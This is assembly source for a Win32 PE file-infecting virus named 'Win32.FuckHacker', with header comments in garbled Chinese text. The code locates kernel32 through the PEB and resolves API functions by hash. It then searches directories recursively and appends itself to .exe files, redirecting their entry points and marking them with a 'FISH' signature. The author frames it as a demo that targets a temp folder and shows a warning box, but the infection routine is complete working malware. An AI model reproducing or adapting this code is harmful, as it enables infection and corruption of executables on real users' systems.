;============================================================================
;
; WIN32.FUNCKHACKER - WRITTEN BY XFISH
; (c)2009-03
;
;============================================================================
;
; DESCRIPCION
; ===========
; 
;   �����������PEB���kernel32����ַ��Ȼ��ͨ��hash�������api����(����Thanks ...    coban2k,Anskya), ���������
;��ֲ���κε�������,��Ҳ���Ǻ�������Ŀǰ��Щͨ����̬ע��(��Ⱦ)����shellcode������... �˲�������û�м��벡�������
;����������epo, ��̬�ȡ����Ǵ�������Ϊȴ�ǱȽϾ�����������Get_Apis���̣����api����  ��� o(��_��)o...
;
;  �˲������������Ϊ����Ϊ�����о���ʹ��,�����������˴������ڳ����У������˽���Loader���� -
;��Ⱦ���̣���Ⱦ�����ҽ�����ȾProgram FilesĿ¼������exe�ļ���������������н���������Ϣ����ʾ���û�.....��Ȼ˵
;�����˴��������Ǹ�Ⱦ��Ҫ�ָ��Ļ���Ҳ���Ǻ�����,���Խ���ʹ��.....
;==============================================================================

macro @pushsz argc{
call @f
db argc, 0
@@:
}

macro RolHash poffset, [szFuncName]{
  local hash, len, char, temp
  virtual at 0
       db  szFuncName
       len = $
       hash = 0
       temp = 0
       repeat len
	 hash = (((hash shl 3) and 0FFFFFFFFh) or (hash shr (32 - 3))); hash = hash rol 3
	 load char byte from % - 1
	 temp = ((hash and 000000FFh) xor char)
	 hash = (hash and 0FFFFFF00h) or temp
       end repeat
  end virtual
    dd hash
  poffset dd 0
}

  format PE GUI 4.0
   include 'win32ax.inc'
   
   entry  Virus_Entry
   
.code
  ;--------------------------
  Virus_Flag equ 'FISH'
  ;--------------------------
  
 Virus_Entry:
   pushad
   pushfd
   
   call  Dels
 Dels:	
   pop	ebp
   sub	ebp, Dels
   ;-------------------------
   ;���Api������ַ
   ;-------------------------
   call  GetKrnl32
   lea	edi, [ebp + dwFuncs]
   call  Get_Apis
   @pushsz  'user32'
   call  [ebp + _LoadLibraryA]
   call  Get_Apis
  ;--------------------------------
  ;Ϊ��û��Σ���ԣ������ж�����������
  ;��������Ⱦ����������Ҳ���޷�ͨ������
  ;�����д���,��������������ʾ���� ��Ⱦ
  ;����Loader�п���.... o(��_��)o...
  ;-------------------------------
   mov	eax, [fs:30h]
   mov	eax, [eax+08h]
   cmp	dword [eax+2], Virus_Flag
   jne	.Loader
   ;-----------------------------------
   ;��Ϣ�򾯸��û��Ѿ��ж�
   ;----------------------------------
   sub	edx, edx
   push  30h
   lea	eax, [ebp + szTitle]
   push  eax
   lea	eax, [ebp + szText]
   push  eax
   push  edx
   call  [ebp + _MessageBoxA]
   ;---------------------------------------
   popfd
   add	esp, 4*8
   lea	eax, [ebp + Jmp_Host]
   jmp	eax
   
  .Loader:
    ;-------------------------
   ;Loader ��Ⱦ����
   ;-------------------------
   mov	edx, ebp
   push  '.exe'
   @pushsz  'd:\\temp\\victim'
   call  Inject_Disk
   
   popfd
   popad
   ret
   
 ;(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
 
    
 ;---------------------------------------------
 ; ���kernel32����ַ
 ; input: nothing
 ;---------------------------------------------
 GetKrnl32:
	mov	eax, [fs:30h] 
	irp    offset, 0ch,1ch,00h,08h {mov eax, [eax+offset]} 
	ret 
 ;---------------------------------------------------
 ;��ȡ�����api������ַ
 ;input : eax =  Krnl32Base , edi = HashFuncAddress
 ;thanks coban2k,Anskya
 ;---------------------------------------------------
 Get_Apis:
   pushad
  xchg	 eax, ebx
  mov	 eax, [ebx+03ch]
  mov	 esi, [eax+ebx+78h]  ; Get Export Rva
  lea	 esi, [esi+ebx+18h]   ; get Export NumberOfFunctions
  
  cld
  lodsd        ; NumberOfFunctions  
  xchg	 eax, ecx
  lodsd        ; AddressOfFunctions
  push	 eax
  lodsd        ; AddressOfNames
  add	 eax, ebx
  xchg	 eax, edx
  lodsd        ; AddressOfNameOrdinals
  add	 eax, ebx
  xchg	 eax, ebp
  xchg	 edx, esi
  
 .Next_Func:
  lodsd
  add	 eax, ebx
  xor	 edx, edx
  
 .Calc_Hash:  
  rol	 edx, 3
  xor	 dl, byte [eax]
  inc	eax
  cmp	byte [eax], 0
  jnz	 .Calc_Hash
  
  push	 edi
  
 .Scan_dw_Funcs:
  cmp	 [edi], edx
  jnz	 .Skip_Function
  
  movzx  eax, word [ebp]
  shl	 eax, 2
  add	 eax, [esp+4]
  mov	 eax, [eax+ebx]
  add	 eax, ebx
  scasd
  stosd
  
 .Skip_Function:
  scasd
  add  edi, 4
  sub	 eax, eax
  cmp	 dword [edi], eax
  jne	 .Scan_dw_Funcs
  
  pop	 edi
  add	 ebp, 2
  loop	.Next_Func
  pop	 ecx
  
  popad
  ret
  
 ;-------------------------------------------
 ; ��Ⱦ���̺���
 ; input: edx = dels(�ض�λƫ�Ʋ�) 
 ;-------------------------------------------
 proc  Inject_Disk lpszDirectory, dwFileType
    locals
      @hFindFile  rd  1
      @stWfd	WIN32_FIND_DATA
      @szSearch  rb  260
    endl
   pushad
   mov	ebx, edx
   lea	esi, [@szSearch]
   push  [lpszDirectory]
   push  esi
   call  [ebx + _lstrcpyA]
   ;---------------------------------------
   ;esi = @szSearch
   ;copy �ļ�·���� esi
   ;---------------------------------------
   @pushsz  '\*.*'
   push  esi
   call  [ebx + _lstrcatA]
   lea	edi, [@stWfd]
   ;----------------------------------------
   ;esi + '\*.*', edi = ptr WIN32_FIND_DATA
   ;---------------------------------------
   push  edi
   push  esi
   call  [ebx + _FindFirstFileA]
  inc  eax
  jz  .Ret
  dec  eax
  mov  [@hFindFile], eax
  .repeat
    pushad
      mov  edi, esi
      xor  eax, eax
      mov  ecx, 260
      rep  movsb
    popad
    ;------------------------------
    cmp  byte [edi+WIN32_FIND_DATA.cFileName], '.'
    je	.FindNext
    ;------------------------------
    push  [lpszDirectory]
    push  esi
    call  [ebx + _lstrcpyA]
  
    @pushsz  '\'
    push  esi
    call  [ebx + _lstrcatA]
    
    lea  edx, [edi+WIN32_FIND_DATA.cFileName]
    push  edx
    push  esi
    call  [ebx + _lstrcatA]
    ;------------------------------
    mov   eax, [edi+WIN32_FIND_DATA.dwFileAttributes]
    and  eax, FILE_ATTRIBUTE_DIRECTORY
    .if  eax = FILE_ATTRIBUTE_DIRECTORY
      mov  edx, ebx
      push  [dwFileType]
      push  esi
      call  Inject_Disk
	jmp  .FindNext
      .endif
    ;-----------------------------
    ; ת��Сд
    ;-----------------------------
      push  esi
      call  StrLwr
      
      push  esi
      call  [ebx + _lstrlenA]
      
      mov  edx, [dwFileType]
      cmp  dword [esi+eax-4], edx
      jne  .FindNext
      ;-----------------------------
      ; ���и�Ⱦ����
      ;-----------------------------
      mov  eax, esi
      call  Inject_File
      
   .FindNext:
     push  edi
     push  [@hFindFile]
     call  [ebx + _FindNextFileA]
  .until  eax = 0
  
  push	[@hFindFile]
  call	[ebx + _FindClose]
 .Ret:
   popad
   ret
 endp
 
 ;----------------------------------------
 ; �ַ���ת��Сд����
 ;----------------------------------------
 proc  StrLwr  uses esi edi, pString
  mov  esi, [pString]
  mov  edi, esi
  @@:
  lodsb
  test	al, al
  je  @f
  .if  al >= 'A' & al <= 'Z'
    or	al, 20h
    stosb
    jmp  @b
  .endif
  stosb
  jmp  @b
  @@:
  ret
 endp  
    
 ;---------------------------------------
 ;input: eax - �����ֵ, ecx - ��������
 ;
 ;Ouput: eax - ����ֵ
 ;---------------------------------------
 Align_Size:  
   pushad
  xor  edx, edx
  push	eax
  div  ecx
  pop  eax
  sub  ecx, edx
  add  eax, ecx
  mov  [esp+4*7], eax
  popad
  ret
  
 ;--------------------------------------
 ;��Ⱦ����
 ;input: eax - �ļ�·��
 ;
 ;OuPut: nothing
 ;---------------------------------------
 Inject_File:
   pushad
   sub	edx, edx
   
   ;---------------------------------
   ;mov  ebp, ebx ....  ebp = dels
   ;---------------------------------
   mov	ebp, ebx
   push  edx
   push  edx
   push  OPEN_EXISTING
   push  edx
   push  FILE_SHARE_READ
   push  GENERIC_WRITE or GENERIC_READ
   push  eax
   call  [ebp + _CreateFileA]
   inc	eax
   jz  .Open_Faild
   dec	eax
   xchg  eax, ebx
   ;---------------------
   ;ebx - �ļ����
   ;---------------------
   
   xor	edx, edx
   push  edx
   push  edx
   push  edx
   push  PAGE_READWRITE
   push  edx
   push  ebx
   call  [ebp + _CreateFileMappingA]
   test  eax, eax
   jz  .OpenMap_Faild
   xchg  eax, esi
   ;-----------------------
   ;esi - �ļ�ӳ����
   ;-----------------------
   
   sub	edx, edx
   push  edx
   push  edx
   push  edx
   push  FILE_MAP_WRITE
   push  esi
   call  [ebp + _MapViewOfFile]
   test  eax, eax
   jz  .MapFile_Faild
   xchg  eax, edi
   ;-----------------------
   ;edi - �ļ�ӳ���ڴ�ƫ��
   ;-----------------------
   
   cmp	word [edi], 'MZ'
   jnz	.Ret
   cmp	dword [edi+2], Virus_Flag
  jz  .Ret
  
  push	0
  push	ebx
  call	[ebp + _GetFileSize]
  
  add  eax, Virus_Size
  mov  edx, [edi+3ch]
  add  edx, edi
  push	dword [edx+3ch]
  pop  ecx
  call	Align_Size
  ;-----------------------
  ;eax - �ļ������С
  ;-----------------------
  pushad
  push	edi
  call	[ebp + _UnmapViewOfFile]
  push	esi
  call	[ebp + _CloseHandle]
  popad
  
  push	eax
  xor  edx, edx
   push  edx
   push  eax  
   push  edx
   push  PAGE_READWRITE
   push  edx
   push  ebx
   call  [ebp + _CreateFileMappingA]
   pop	ecx
   or  eax, eax
   jz  .OpenMap_Faild
   xchg  eax, esi
   ;-----------------------
   ;esi - �ļ�ӳ����
   ;ecx - �ļ������С
   ;-----------------------
   
  sub  edx, edx
   push  ecx
   push  edx
   push  edx
   push  FILE_MAP_WRITE
   push  esi
   call  [ebp + _MapViewOfFile]
   test  eax, eax
   jz  .MapFile_Faild
   xchg  eax, edi
   ;-----------------------
   ;edi - �ļ�ӳ���ڴ�ƫ��
   ;-----------------------
 
   mov	edx, [edi+3ch]
   cmp	word [edx+edi], 'PE'
   jnz	.Ret
   
   ;-----------------------
   ;edx - PEͷ�ṹƫ��
   ;ecx - �ڱ�����-1�Ĵ�С
   ;eax - ����Ŀ¼�δ�С
   ;-----------------------
   add	edx, edi
   movzx  ecx, word [edx+06h]
   dec	ecx
   imul  ecx, ecx, 28h
   mov	eax, [edx+74h]
   shl	eax, 3
 
   ;-------------------------
   ;edx - ָ��ĩβ�ڱ�λ��
   ;-------------------------
   add	edx, 78h
   add	edx, ecx
   add	edx, eax
   
   ;----------------------------------------
   ;ecx = SizeOfRawData + pointerToRawData
   ;----------------------------------------
   mov	ecx, [edx+14h]
   add	ecx, [edx+10h]
   push  ecx
   
   ;---------------------------------------
   ;New oep = SizeOfRawData +��virtual address
   ;    eax = [edx+10h]��   +��[edx+0ch]
   ;---------------------------------------
   mov	eax, [edx+10h]
   add	eax, [edx+0ch]
   
   ;---------------------------------------
   ;  ����jmp���ƫ��ֵ��Ȼ��д��
   ;---------------------------------------
   mov	ecx, [edi+3ch]
   pushad
   xchg  eax, edx
   add	edx, Jmp_Size
   mov	eax, [ecx+edi+28h]
   sub	eax, edx
   mov	[ebp + Jmp_Addr], eax
   popad
   
   ;-----------------------------------
   ;[ecx+edi+28h] = AddressOfEntryPoint
   ;-----------------------------------
   mov	[ecx+edi+28h], eax
   
   ;-----------------------------
   ;[edx+10h] - SizeOfRawData
   ;[ecx+edi+3ch] - File Aligment
   ;----------------------------
   mov	eax, [edx+10h]
   add	eax, Virus_Size
   mov	ecx, [edi+3ch]
   mov	ecx, [ecx+edi+3ch]
   call  Align_Size
   
   ;-----------------------------
   ;[edx+10h] - SizeOfRawData
   ;[edx+08h] - VirtualSize
   ;[ecx+edi+50h] - SizeOfImage
   ;0A0000020h - �ɶ���д��ִ�еĽ�����
   ;------------------------------
   mov	[edx+10h], eax
   mov	[edx+08h], eax
   
   ;-----------eax + virtual address--------
   add	eax, [edx+0ch]
   mov	ecx, [edi+3ch]
   mov	[ecx+edi+50h], eax
   or  dword [edx+24h], 0A0000020h
   mov	dword [edi+2], Virus_Flag
   
   pop	eax ;ȡ����ʱ�洢
   
   ;-----------------------------------
   pushad
   xchg  eax, esi
   add	esi, edi
   xchg  esi, edi
   
   lea	esi, [ebp + Virus_Entry]
   mov	ecx, Virus_Size
   rep	movsb
   popad
 .Ret:
   push  edi
   call  [ebp + _UnmapViewOfFile]
 .MapFile_Faild:
   push  esi
   call  [ebp + _CloseHandle]  
 .OpenMap_Faild:
   push  ebx
   call  [ebp + _CloseHandle]
 .Open_Faild:
   popad
   ret
   
  ; ----------------------------------------------   
  ;  Jmp  HostAddress
  Jmp_Host:
   jmp	12345678
    Jmp_Addr = $ - 4
    Jmp_Size = $ - Virus_Entry
  ; ----------------------------------------------


 ;--------------------------------------------------------------
   szText    db  'Win32 PE Virus Demo, The Worm Name Is FuckHacker o(��_��)o.........', 0
   szTitle    db  'Win32 PE Virus Demo', 0
 
 dwFuncs:
   RolHash    _lstrcpyA, 'lstrcpyA'
   RolHash    _lstrcatA, 'lstrcatA'
   RolHash   _lstrlenA, 'lstrlenA'
   ;RolHash  _CreateThread, 'CreateThread'
   ;RolHash  _CreateEventA, 'CreateEventA'
   ;RolHash  _GetLastError, 'GetLastError'
   ;RolHash  _ExitThread, 'ExitThread'
   RolHash    _FindFirstFileA, 'FindFirstFileA'
   RolHash   _FindNextFileA, 'FindNextFileA'
   RolHash    _FindClose, 'FindClose'
   RolHash    _CreateFileA, 'CreateFileA'
   RolHash   _WriteFile, 'WriteFile'
   RolHash   _ReadFile, 'ReadFile'
   RolHash    _GetFileSize, 'GetFileSize'
   RolHash   _CloseHandle, 'CloseHandle'
    RolHash   _LoadLibraryA, 'LoadLibraryA'
    RolHash   _GetProcAddress, 'GetProcAddress'
    RolHash	_MapViewOfFile, 'MapViewOfFile'
    RolHash    _CreateFileMappingA, 'CreateFileMappingA'
    RolHash   _UnmapViewOfFile, 'UnmapViewOfFile'
    RolHash   _MessageBoxA, 'MessageBoxA'
    rd	  4
  ;----------------------------------------------------------

 Virus_Size = $ - Virus_Entry
